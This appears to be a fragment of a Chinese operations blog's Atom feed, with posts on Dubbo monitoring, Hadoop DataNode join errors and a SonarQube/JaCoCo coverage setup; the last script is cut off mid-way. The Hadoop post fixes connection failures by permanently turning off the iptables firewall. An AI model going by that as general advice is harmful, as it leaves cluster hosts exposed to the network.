&lt;h3 id=&quot;服务提供端配置&quot;&gt;&lt;a href=&quot;#服务提供端配置&quot; class=&quot;headerlink&quot; title=&quot;服务提供端配置&quot;&gt;&lt;/a&gt;服务提供端配置&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://dubbo.io/User+Guide-zh.htm#UserGuide-zh-%3Cdubbo%3Amonitor%2F%3E&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dubbo服务提供端监控配置&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里放了张我们现在集群监控图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Dubbo-monitor.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前面我安装了Dubbo监控管控台dubbo-admin的安装配置可以到我dubbo书签🔖查看。&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitor-详细介绍&quot;&gt;&lt;a href=&quot;#Dubbo-Monitor-详细介绍&quot; class=&quot;headerlink&quot; title=&quot;
    
    </summary>
    
      <category term="tomcat" scheme="http://blog.yangcvo.me/categories/tomcat/"/>
    
    
      <category term="Java+Tomcat notes" scheme="http://blog.yangcvo.me/tags/Java-Tomcat-notes/"/>
    
      <category term="Dubbo" scheme="http://blog.yangcvo.me/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>hadoop新增节点集群启动请求异常：Last contact：200</title>
    <link href="http://blog.yangcvo.me/2016/12/08/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/%20hadoop%E6%96%B0%E5%A2%9E%E8%8A%82%E7%82%B9%E9%9B%86%E7%BE%A4%E5%90%AF%E5%8A%A8%E8%AF%B7%E6%B1%82%E5%BC%82%E5%B8%B8%EF%BC%9ALast%20contact%EF%BC%9A200/"/>
    <id>http://blog.yangcvo.me/2016/12/08/大数据hadoop/ hadoop新增节点集群启动请求异常：Last contact：200/</id>
    <published>2016-12-08T09:56:03.000Z</published>
    <updated>2017-03-14T05:45:12.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言闲谈：&quot;&gt;&lt;a href=&quot;#前言闲谈：&quot; class=&quot;headerlink&quot; title=&quot;前言闲谈：&quot;&gt;&lt;/a&gt;前言闲谈：&lt;/h3&gt;&lt;p&gt;之前做CDN云计算公司来到美年大健康现在在一家医疗大数据公司负责运维部门大大小小的活，既然是医疗大数据当然离不开大数据存储的维护，现在也同时维护大数据运维相关工作 &lt;code&gt;hadoop,spark,sqoop,hue,hive,Hbase,zookeeper&lt;/code&gt;等等 测试开发生产使用起来,从集群环境维护 提升数据稳定性 高可用维护。&lt;/p&gt;
&lt;p&gt;前面说了一堆自己闲聊，真正解决这次问题是hadoop新增节点需要注意哪几点：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;新增节点如何新增我会在另外一篇详细说的这里我讲一些需要注意掉的问题。&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;需要修改几个配置：&quot;&gt;&lt;a href=&quot;#需要修改几个配置：&quot; class=&quot;headerlink&quot; title=&quot;需要修改几个配置：&quot;&gt;&lt;/a&gt;需要修改几个配置：&lt;/h3&gt;&lt;p&gt;（1）hadoop data 数据目录 VERSION 里面的搭建集群时，直接克隆会出现这个问题。解决方法同上两种，最好修改${/hadoop/tmp/dir}/dfs/data/current/VERSION中的storageID，使其不同。第一种会导致hdfs数据丢失。&lt;/p&gt;
&lt;p&gt;解决方法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;（1） datanode启动是会加载DataStorage，如果不存在则会format&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;（2）初次启动DataStorage的storageID是空的，所以会生成一个storageID&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参考我解决的：&lt;code&gt;这里我拷贝过来 直接删除。等集群namenode启动 会自动生成。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个解决以后 新增的机器必须关闭防火墙。因为这个原因会导致我 hadoop新增节点集群启动请求异常：Last contact：200&lt;/p&gt;
&lt;p&gt;（2） 集群重启时防火墙自动开启导致：&lt;/p&gt;
&lt;p&gt;这里贴张图片给大家看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;问题：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:30,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 8 time(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:31,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 9 time(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:31,479 ERROR org.apache.hadoop.hdfs.server.datanode.DataNode: java.io.IOException: Call to /192.168.18.218:9000 failed on &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; exception: java.net.NoRouteToHostException: 没有到主机的路由&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        at org.apache.hadoop.ipc.Client.wrapException(Client.java:775)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        at org.apache.hadoop.ipc.Client.call(Client.java:743)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;解决方法：在root权限下关闭防火墙：service iptables stop&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最好配置成机器重启默认防火墙关闭：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@junlings ~]&lt;span class=&quot;comment&quot;&gt;# chkconfig iptables off   #开机不启动防火墙服务&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@junlings ~]&lt;span class=&quot;comment&quot;&gt;# chkconfig iptables on   #开机启动防火墙服务&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;解决以后服务重新跑一遍已经搞定。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言闲谈：&quot;&gt;&lt;a href=&quot;#前言闲谈：&quot; class=&quot;headerlink&quot; title=&quot;前言闲谈：&quot;&gt;&lt;/a&gt;前言闲谈：&lt;/h3&gt;&lt;p&gt;之前做CDN云计算公司来到美年大健康现在在一家医疗大数据公司负责运维部门大大小小的活，既然是医疗大数据当然离不开大数
    
    </summary>
    
      <category term="大数据" scheme="http://blog.yangcvo.me/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
      <category term="Big data Hadoop" scheme="http://blog.yangcvo.me/tags/Big-data-Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Sonarqube和jacoco搭建代码检查</title>
    <link href="http://blog.yangcvo.me/2016/12/07/Java-Dubbo/Sonarqube%E5%92%8Cjacoco%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5/"/>
    <id>http://blog.yangcvo.me/2016/12/07/Java-Dubbo/Sonarqube和jacoco搭建代码检查/</id>
    <published>2016-12-07T09:56:03.000Z</published>
    <updated>2017-03-14T05:57:33.000Z</updated>
    
    <content type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;准备工作：&lt;code&gt;sonarqube，jacoco，git，maven，ant，sonar-runner&lt;/code&gt;&lt;br&gt;sonarqube 去官网下载，文件太大，不能上传&lt;br&gt;git，mavne，ant自己安装&lt;br&gt;sonarqube和sonar-runnrt安装：查看&lt;a href=&quot;http://blog.csdn.net/u011925176/article/details/51536563&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;监控机子配置：&lt;br&gt;启动sonarqube，git下载源代码，进入源码路径，添加一下文件；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1）sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Set sonar-runner Configuration&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectKey=haozhuo-hm-01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectVersion=6.1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectName=haozhuo-hm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.language=java&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(1). 需要分析代码的路径&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sonar.sources=src/main/java/com/haozhuo/hm/service, src/main/java/com/haozhuo/hm/dubbo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(2). 这个地方很重要，工程class文件的位置，代码覆盖率就是根据这个不匹配的，如果线上的代码和线下的代码不同步，可能会造成覆盖率计算不精确。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sonar.java.binaries=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/target&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.test.binaries=&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.sourceEncoding=UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.my.property=value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.java.coveragePlugin=jacoco&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Path to the JaCoCo report file containing coverage data by unit tests. The path may be absolute or relative to the project base directory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.reportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Path to the JaCoCo report file containing coverage data by integration tests. The path may be absolute or relative to the project base directory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.itReportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sonar.jacoco.reportMissing.force.zero&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.reportMissing.force.zero=&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(3). build.xml&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&lt;span class=&quot;string&quot;&gt;&quot;1.0&quot;&lt;/span&gt; encoding=&lt;span class=&quot;string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;project name=&lt;span class=&quot;string&quot;&gt;&quot;testCodeCoveage&quot;&lt;/span&gt; default=&lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; basedir=&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt; xmlns:jacoco=&lt;span class=&quot;string&quot;&gt;&quot;antlib:org.jacoco.ant&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!--&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;property name=&lt;span class=&quot;string&quot;&gt;&quot;jacocoantPath&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;/root/jacocoant.jar&quot;&lt;/span&gt;/&amp;gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;property name=&lt;span class=&quot;string&quot;&gt;&quot;jacocoexecPath&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- Import the JaCoCo Ant Task --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;taskdef uri=&lt;span class=&quot;string&quot;&gt;&quot;antlib:org.jacoco.ant&quot;&lt;/span&gt; resource=&lt;span class=&quot;string&quot;&gt;&quot;org/jacoco/ant/antlib.xml&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;classpath path=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/jacocoant.jar&quot;&lt;/span&gt; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/taskdef&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;merge&quot;&lt;/span&gt; depends=&lt;span class=&quot;string&quot;&gt;&quot;dump&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:merge destfile=&lt;span class=&quot;string&quot;&gt;&quot;jacoco.exec&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- 导出&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;文件地址，在这里统一生产一个&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;文件 --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;fileset dir=&lt;span class=&quot;string&quot;&gt;&quot;/opt/haozhuo-hm/jacoco&quot;&lt;/span&gt; includes=&lt;span class=&quot;string&quot;&gt;&quot;*.exec&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/jacoco:merge&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/target&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;dump&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;是指在dump完成之后，重置jvm中的覆盖率数据为空。append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;是指dump出来的&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;文件为增量方式 --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;192.168.1.19&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;false&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/opt/haozhuo-hm/jacoco/jacoco_haozhuo-hm.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- &amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.117&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.117_2.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10002&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.118&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.118_1.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.118&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.118_2.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10002&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt; --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!--&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.170.26&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco_10.199.170.26.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/target&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- ========= The main target &lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; ========= --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; depends=&lt;span class=&quot;string&quot;&gt;&quot;merge&quot;&lt;/span&gt; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/project&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(4). jacoco.sh&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#加载环境变量&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; /etc/profile&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sonar-runner 路径&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /Users/yejun/software/sonar-runner-2.4/haozhuo-hm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#初始化当前时间、周&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;time=`date &lt;span class=&quot;string&quot;&gt;&#39;+%s&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;lastweek=`cat /var/run/coverage.pid`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;newweek=`date +%W`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#获取最新代码&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git pull&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#编译最新代码，如果使用jacoco agent通过classdumpdir路径dump出来的class文件，则不需要mvn clean进行class文件编译。否则需要编译class文件。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#mvn clean install -Dmaven.test.skip=true -Ptest&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#获取历史版本和最新版本&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#oldVersion=`cat /var/run/coverage.pid`&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;newversion=`grep -r &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;version&amp;gt;&quot;&lt;/span&gt; pom.xml |awk -F &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $1&amp;#125;&#39;&lt;/span&gt;|awk -F &lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span 